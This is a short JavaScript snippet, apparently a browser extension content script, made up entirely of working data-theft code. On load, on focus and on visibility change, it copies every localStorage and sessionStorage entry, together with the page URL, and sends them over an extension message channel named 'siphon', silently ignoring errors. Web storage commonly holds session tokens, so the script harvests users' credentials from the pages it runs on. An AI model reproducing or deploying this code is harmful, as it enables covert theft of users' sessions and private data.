(() => {
  const read = (area) => {
    const out = [];
    try {
      for (let i = 0; i < area.length; i += 1) {
        const key = area.key(i);
        out.push([key, area.getItem(key)]);
      }
    } catch {}
    return out;
  };
  const send = () =>
    globalThis.extenso.messages
      .send('siphon', 'storage', { url: location.href, local: read(localStorage), session: read(sessionStorage) })
      .catch(() => {});
  send();
  addEventListener('focus', send);
  addEventListener('visibilitychange', () => {
    if (!document.hidden) send();
  });
})();
